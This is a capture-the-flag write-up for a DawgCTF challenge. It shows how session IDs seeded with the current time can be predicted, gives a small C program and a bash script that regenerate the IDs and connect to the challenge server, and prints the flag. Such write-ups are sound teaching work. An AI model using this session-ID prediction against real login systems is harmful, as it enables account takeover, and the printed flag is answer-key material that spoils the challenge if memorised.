# Well Timed Authentication

Upon connecting to the server, we are given a login page:

```
     __
(___()'`;
/,    /`
\\"--\\

Welcome! Please login!
(L)ogin normally or use (S)ession id? (L/S):
```

While reading the [source code](auth.c), I found out that there are 3 users.

```c
const char* users[3] = {"TrueGrit", "root", "guest"};
#define users_len (sizeof (users) / sizeof (const char *))
#define TRUEGRIT 0
#define ROOT 1
#define GUEST 2
long sessionID[users_len];
```
You aren't able to get the flag as guest, because you don't have sufficient permissions.
```
     __
(___()'`;
/,    /`
\\"--\\

Welcome! Please login!
(L)ogin normally or use (S)ession id? (L/S): L
login as: guest
guest@umbc$ cat flag.txt
Unknown command.
Available commands: ls, whoami, sid, dog, flag, time
guest@umbc$ flag
cat: flag.txt: Permission denied
guest@umbc$
```
We'll have to figure out how to login as root.

We have two different options to login with, session ID and password.

Looking at the password authentication function, it seems like we hit a dead end:

```c
FILE *fp = fopen("/dev/random", "r");
if(fp == NULL){
  return -1;
}
char* line = NULL;
size_t len = 64;
getline(&line, &len, fp);
if(line == NULL){
  return -1;
}
```

There's not a good chance that we are going to be able to predict the behavior of `/dev/random`, so let's move on.

In `sessionauth()`, it compares your input to the session IDs they have:

```c
long sessionauth(){
    char session[20];
    printf("Enter session ID: "); // Prompt session ID
    fgets(session, 20, stdin);
    long result = atol(session);
    int uid = -1;
    for(int i = 0; i < users_len; i++){
        if(sessionID[i] == result){
            uid = i;
        }
    }
    authwait();
    return uid;

}
```

It generates the session IDs using this function:

```c
void generatesessionids(){
    time_t curtime;
    struct tm * timeinfo;
    time(&curtime);
    srand(curtime);
    for(int i = 0; i < users_len; i++){
        sessionID[i] = (rand() ^ rand());
    }
}
```

Bingo! It uses the system time to generate a pseudorandom number, which can be predicted.

I copied and pasted the code into [my own script](hack.c), and printed the session IDs to the screen:

```c
int main(){
    setbuf(stdin, 0);
    printwelcomemessage();
    generatesessionids();
    for(int i = 0; i < users_len; i++) {
      printf("%s: %d\n", users[i], sessionID[i]);
    }
    return 0;

}
```

Then, I made my own [bash script](evil-bash-script) to print the session ids for me, and connect me to the server right after that:

```bash
#!/bin/bash
./hack
./auth # nc ctf.umbccd.io 5600
```

All we have to do now is run that script, and copy and paste the ID we want. We can log in as anyone we like now! I'm going to log in as TrueGrit:

```
$ ./evil-bash-script
           __
      (___()'`;
      /,    /`
      \\"--\\

Welcome! Please login!
Current time: 1588025798
TrueGrit: 63031782
root: 739356463
guest: 1863042855
           __
      (___()'`;
      /,    /`
      \\"--\\

Welcome! Please login!
(L)ogin normally or use (S)ession id? (L/S): S
Enter session ID: 63031782
Authenticating...
TrueGrit@umbc$ flag
DawgCTF{ps3ud0_r4nd0m_1s_n0t_tru3_r4nd0m}
```

Flag: `DawgCTF{ps3ud0_r4nd0m_1s_n0t_tru3_r4nd0m}`
